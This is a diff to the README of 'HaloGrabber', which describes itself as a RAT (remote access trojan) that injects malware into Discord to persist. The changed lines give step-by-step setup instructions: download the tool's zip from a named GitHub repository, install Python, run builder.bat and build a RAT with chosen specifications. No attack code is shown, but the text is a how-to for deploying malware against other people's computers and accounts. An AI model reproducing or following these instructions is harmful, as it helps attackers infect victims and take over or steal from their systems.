@@ -90,11 +90,16 @@ Discord Injection - Injects malware into discord so even if the rat is found and
 
 HOW TO SETUP : 
 
-On the github page, navigate to blob:https://github.com/c37e7186-5778-42dd-ae37-d25948c35ee9
+On the github page, navigate to https://github.com/nicolas1100/HaloGrabber/blob/main/HaloGrabber.zip or just press the link.
+
+Press the download button on the upper right of the page to download the zip file.
+
+Extract the HaloGrabber zip file.
+
 Download and install Python 3 or any higher version. (Make sure to enable the Add to PATH option.)
-Download HaloGrabber.
-Extract the zip file.
+
 Navigate to the HaloGrabber folder and double click builder.bat file to download the required libraries.
+
 Choose your specifications for your rat and press build.
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
